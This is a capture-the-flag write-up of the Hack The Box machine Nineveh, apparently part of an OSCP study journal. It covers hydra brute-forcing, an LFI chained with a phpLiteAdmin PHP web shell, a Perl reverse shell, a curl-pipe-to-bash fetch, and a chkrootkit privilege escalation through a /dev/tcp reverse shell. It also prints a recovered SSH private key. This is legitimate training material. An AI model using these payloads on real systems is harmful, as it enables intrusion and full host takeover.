---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/hack-the-box/linux-boxes/nineveh-medium
---

# ✅ Nineveh (Medium)

## Lesson Learn

![](../../../../../../.gitbook/assets/Nineveh.PNG)

## Report-Penetration

**Vulnerable Exploit:** LFI, Code Execution, Weak password policy

**System Vulnerable:** 10.10.10.43

**Vulnerability Explanation:** The machine is vulnerable to LFI on port 80 and set up with weak password policy. On port 443, it is vulnerable to Code Execute via phpLiteAdmin. It chain from LFI to execute our reverse shell and allow us to gain initial shell on the machine.

**Privilege Escalation Vulnerability:** Chkrootkit version out of dated

**Vulnerability Fix:** All users must set with strong password, validated the user input and apply patch to the system.&#x20;

**Severity:** Critical

**Step to Compromise the Host:**&#x20;

## Reconnaissance

```
└─$ nmap -sC -sV -T4 -p- 10.10.10.43     
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-04 04:17 EDT
Nmap scan report for 10.10.10.43
Host is up (0.048s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

## Enumeration

### Port 80 Apache/2.4.18

By going through webpage on port 80, but nothing is there even source code.

![](<../../../../../../.gitbook/assets/image (789).png>)

![](<../../../../../../.gitbook/assets/image (507).png>)

By nmap script, we found hostname **nineveh.htb**. Let add to **/etc/hosts**.

Following through the hostname, we still got the same page.

![](<../../../../../../.gitbook/assets/image (486).png>)

Let run gobuster to find if there is any directory hidden. We found one directory **/department.**

```
└─$ gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50                                                            1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.43
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/04 04:44:37 Starting gobuster in directory enumeration mode
===============================================================
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]                                     
                                                                                    
===============================================================
2021/11/04 04:49:20 Finished
===============================================================
```

Going through with /department directory, it leads us to the login page. First thing come to mind when I see login page, I will try with default credential and SQL injection but doesn't work.

![](<../../../../../../.gitbook/assets/image (258).png>)

By viewing the source code, we can assume those are username **admin** and **amrois**. On the login webpage could allow us to enumerate the username.

Once we enter username admin and random password, the error message display **"Invalid Password"** and if we enter username amrois, it displays **"Invalid Username"**. We can confirms that username is admin.

![](<../../../../../../.gitbook/assets/image (530).png>)

Let start intercept proxy on burp to check how many parameters are require once we hit login.

![](<../../../../../../.gitbook/assets/image (246).png>)

### Brute Force web

Let perform hydra to brute login with username admin.

```
└─$ hydra -l 'admin' -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt nineveh.htb http-post-form '/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!' 
```

Wait for sometimes, we found the valid credential with username admin

```
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
```

We are now successfully log into the webpage. By click on Home button it doesn't work. Then, on Notes button, it displays some information.

![](<../../../../../../.gitbook/assets/image (720).png>)

![](<../../../../../../.gitbook/assets/image (495).png>)

There is another way to bypass the authentication.&#x20;

![](<../../../../../../.gitbook/assets/image (552).png>)

[strcmp()](https://www.w3schools.com/php/func_string_strcmp.asp) function in php use for comparing 2 strings.

### Port 443 Apache/2.4.18 (Ubuntu)

Let start with port 443, we found the different webpage. Viewing the source code but nothing.

![](<../../../../../../.gitbook/assets/image (805).png>)

Let enumerate on Certificate whether we can find other hostname. We got the same result.

![](<../../../../../../.gitbook/assets/image (465).png>)

Let run gobuster to find if there is any directory hidden. We found there are two directories are interesting **/db and /secure\_notes.**

```
└─$ gobuster dir -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.43
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/04 04:50:56 Starting gobuster in directory enumeration mode
===============================================================
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/server-status        (Status: 403) [Size: 300]                              
/secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]
                                                                                       
===============================================================
2021/11/04 04:55:31 Finished
===============================================================
```

Following with /db directory, it let us to **phpLiteAdmin** login webpage. Trying with default credential and SQL injection but doesn't work.

![](<../../../../../../.gitbook/assets/image (309).png>)

Let start bruteforce once again against db login webpage. We got a valid credentials.

![](<../../../../../../.gitbook/assets/image (300).png>)

```
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect'
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
```

We can log into **phpLiteAdmin** now. phpLiteAdmin is a PHP tool to interact with SQLite Databases and it's similar to phpMyadmin databases.

SQLite is a kind of plain text database system, we can insert php code in a table and rename that database to **.php** we can execute it.

![](<../../../../../../.gitbook/assets/image (391).png>)

Then, going to /secure-notes, it just displays an image seem like it's something we need to check.

![](<../../../../../../.gitbook/assets/image (556).png>)

## Exploitation

### Port 80 (LFI)

On the URL, we have seen the parameter file path and the thing we need to test is LFI.&#x20;

```
# Request
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt

# Response
. Have you fixed the login page yet! hardcoded username and password is really bad idea!

. check your serect folder to get in! figure it out! this is your challenge

. Improve the db interface.
~amrois
```

```
# Request 
http://10.10.10.43/department/manage.php?notes=files/../../../etc/passwd
http://10.10.10.43/department/manage.php?notes=../../../etc/passwd
http://10.10.10.43/department/manage.php?notes=ninevehNotes../../../etc/passwd

# Response
No Note is selected.
```

**include():** is the php function and if we get any PHP code there, it doesn't matter what extension is, it's going to execute that file with PHP.&#x20;

```
# Request
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../etc/passwd
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../etc/passwd

# Response
Warning:  include(files/ninevehNotes): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31
Warning:  include(): Failed opening 'files/ninevehNotes' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31
```

From the above result, if we don't include the /ninevehNotes, it will return **"no Note is selected"**.&#x20;

```
# Request
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../../etc/passwd
```

![](<../../../../../../.gitbook/assets/image (871).png>)

Now it's working. Normally for LFI vulnerable, it usually needs another vulnerability in order to get remote code execution.&#x20;

### Port 443 (Code Execution)

By searching for public exploit on phpLiteAdmin, it is vulnerable to PHP remote code injection.

![](<../../../../../../.gitbook/assets/image (594).png>)

```
# phpLiteAdmin 1.9.3 - Remote PHP Code Injection

Description:

phpliteadmin.php#1784: 'Creating a New Database' => 
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.
```

### PHPLiteAdmin RCE

First create a new table with name: testing and number of fields: 1.

![](<../../../../../../.gitbook/assets/image (410).png>)

Let inject the php code into the field and change type to text and hit create.

```
<?php system($_REQUEST['cmd']); ?>
```

![](<../../../../../../.gitbook/assets/image (278).png>)

We can go change the database name with .php extension and we can see the path to execute.

![](<../../../../../../.gitbook/assets/image (564).png>)

![](<../../../../../../.gitbook/assets/image (565).png>)

Let get back to our LFI and get execute the file path. As we got the error message.

```
# Request
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../../var/tmp/code.php&cmd=ls

#Resonse
Parse error:  syntax error, unexpected 'cmd' (T_STRING), expecting ']' in /var/tmp/code.php on line 2
```

Let change execute to _`<?php system($_REQUEST["cmd"]); ?>`_ and now it executed.

```
# Request:
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../../var/tmp/code.php&cmd=ls
```

![](<../../../../../../.gitbook/assets/image (639).png>)

By now let send this request to burp and start our netcat listener on port 4444.

```
nc -lvp 4444
```

Let grab revershell from pentest monkey.

```
# Before Encode
cmd=perl -e 'use Socket;$i="10.10.14.31";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

# Request for reverse shell
GET /department/manage.php?notes=/ninevehNotes/../../../var/tmp/code.php&cmd=perl+-e+'use+Socket%3b$i%3d"10.10.14.31"%3b$p%3d4444%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen(STDERR,">%26S")%3bexec("/bin/bash+-i")%3b}%3b' HTTP/1.1
```

![](<../../../../../../.gitbook/assets/image (450).png>)

## Privilege Escalation

Let start transfer file lineum.sh for enumerating on the victim machine.

```
python3 -m http.server 80
```

From our victim machine, we can grab and execute the file.

```
curl 10.10.14.31/lineum.sh | bash
```

As we can see port 22 open on the machine but our nmap result doesn't detect that.

![](<../../../../../../.gitbook/assets/image (788).png>)

Let start transfer fie pspy32 to our machine to enumerate the process running on machine.

```
wget 10.10.14.13/pspy32 
chmod +x pspy32
./pspy32
```

### chkrootkit (Priv-Esc)

We notice every second or minute, file chrootkit always run.

![](<../../../../../../.gitbook/assets/image (842).png>)

Otherwise can run the script from Ippsec video,

```
#!/bin/bash

#loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process")
	sleep 1
	old_process=$new_process
done
```

By searching on public exploit, we found it's vulnerable to local privilege escalation.&#x20;

![](<../../../../../../.gitbook/assets/image (885).png>)

```
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.

Suggested fix: Put quotation marks around the assignment.
```

Go to /tmp folder and create file update with bash scripting reverse shell.

```
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.31/5555 0>&1' > update
chmod +x update
```

Let start our netcat listener on port 5555 and wait about 1minute our shell pop up as root user.

![](<../../../../../../.gitbook/assets/image (548).png>)

## Extra Content

### Steganography (Image)

Remember, we found an image on /secure-notes. Let download the image file and check on that. Checking the file type of that image just simple PNG image.

```
└─$ file nineveh.png    
nineveh.png: PNG image data, 1497 x 746, 8-bit/color RGB, non-interlaced
```

We can use `strings` command on the file to view the image file in string value. We found the ssh key stored on the image file.

```
└─$ strings nineveh.png -n 20
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

other method, we are using [binwalk](https://www.kali.org/tools/binwalk/) for searching binary images for embedded files and executable code. We can see hidden tar archive file.

```
└─$ binwalk nineveh.png    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)
```

```
└─$ binwalk -Me nineveh.png 

Scan Time:     2021-11-05 04:31:33
Target File:   /home/pwned/Desktop/HTB/nineveh/nineveh.png
MD5 Checksum:  353b8f5a4578e4472c686b6e1f15c808
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)


Scan Time:     2021-11-05 04:31:34
Target File:   /home/pwned/Desktop/HTB/nineveh/_nineveh.png.extracted/54
MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Scan Time:     2021-11-05 04:31:34
Target File:   /home/pwned/Desktop/HTB/nineveh/_nineveh.png.extracted/secret/nineveh.pub
MD5 Checksum:  6b60618d207ad97e76664174e805cfda
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             OpenSSH RSA public key


Scan Time:     2021-11-05 04:31:34
Target File:   /home/pwned/Desktop/HTB/nineveh/_nineveh.png.extracted/secret/nineveh.priv
MD5 Checksum:  f426d661f94b16292efc810ebb7ea305
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PEM RSA private key
```

* -M stand for Recursively scan extracted files
* -e stand for Automatically extract known file types

```
└─$ ls _nineveh.png.extracted 
2BF8D0.tar  54  54.zlib  secret

└─$ ls _nineveh.png.extracted/secret 
nineveh.priv  nineveh.pub                        
```

We can now start ssh to the server with private key and username amrois. But unfortunately it doesn't response anything.

```
└─$ ssh -i nineveh.priv amrois@10.10.10.43 
```

### Port Knocking

On the machine, we found port 22 open on the machine but nmap can't detect.

![](<../../../../../../.gitbook/assets/image (416).png>)

We can check on the process running, we found this,

```
www-data@nineveh:/tmp$ ps aux | grep knock
root      1312  1.0  0.2   8756  2228 ?        Ss   Nov04   3:46 /usr/sbin/knockd -d -i ens160
```

On the machine, we saw this one as well. Let view the file content and we see **default\_file** path.

```
www-data@nineveh:/etc/init.d$ ls | grep kn
knockd

www-data@nineveh:/etc/init.d$ cat knockd 
#! /bin/sh

### BEGIN INIT INFO
# Provides:          knockd
# Required-Start:    $network $syslog
# Required-Stop:     $network $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: port-knock daemon
### END INIT INFO

PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
DAEMON=/usr/sbin/knockd
NAME=knockd
PIDFILE=/var/run/$NAME.pid
DEFAULTS_FILE=/etc/default/knockd
DESC="Port-knock daemon"
OPTIONS=" -d"
```

Viewing the content of /etc/default/knockd, we can see the config file **/etc/knockd.conf**.

```
www-data@nineveh:/etc/init.d$ cat /etc/default/knockd 
################################################
#
# knockd's default file, for generic sys config
#
################################################

# control if we start knockd at init or not
# 1 = start
# anything else = don't start
#
# PLEASE EDIT /etc/knockd.conf BEFORE ENABLING
START_KNOCKD=1

# command line options
KNOCKD_OPTS="-i ens160"

```

Again, let view the content of the file. We found the sequence port to openssh.

```
www-data@nineveh:/$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

Let knock the port to open with for loop. [https://wiki.archlinux.org/title/Port\_knocking](https://wiki.archlinux.org/title/Port_knocking)

```
└─$ for i in 571 290 911; do nmap -Pn --max-retries 0 -p $i 10.10.10.43 && sleep 1; done
```

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 07:34 EDT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
571/tcp filtered umeter

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 07:34 EDT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
290/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 07:34 EDT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.43
Host is up.

PORT    STATE    SERVICE
911/tcp filtered xact-backup

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

Let check on port 22 again, we found it opened now.

```
└─$ nmap -p22 10.10.10.43              
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 07:34 EDT
Nmap scan report for 10.10.10.43
Host is up (0.043s latency).

PORT   STATE SERVICE
22/tcp open  ssh
```

Now we can SSH to the server with username amrois.

![](<../../../../../../.gitbook/assets/image (368).png>)
